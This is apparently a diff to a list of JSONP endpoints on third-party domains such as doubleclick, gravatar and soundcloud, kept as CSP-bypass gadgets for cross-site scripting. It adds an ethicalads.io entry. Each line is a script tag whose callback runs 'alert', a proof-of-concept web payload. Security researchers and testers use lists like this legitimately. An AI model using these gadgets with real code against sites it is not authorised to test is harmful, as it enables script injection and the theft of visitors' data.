@@ -88,6 +88,7 @@ secure.adnxs.com	<script src="https://secure.adnxs.com/getuidp?callback=alert(1)
 secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>
 secure.quantserve.com	<script src="https://secure.quantserve.com/api/segments.json?callback=alert"></script>
 securepubads.g.doubleclick.net	<script src="https://securepubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&iu=%2F32173961%2Fdesktop%2Ffrontpage%2Flisting&sz=300x250&url=https%3A%2F%2Fwww.reddit.com%2F&vrg=147&callback=alert"></script>
+server.ethicalads.io <script src="https://server.ethicalads.io/api/v1/decision/?publisher=jsbin&ad_types=x&format=jsonp&div_ids=x&callback=alert(1)-"></script>
 shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>
 social.yandex.ru	<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>
 soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>
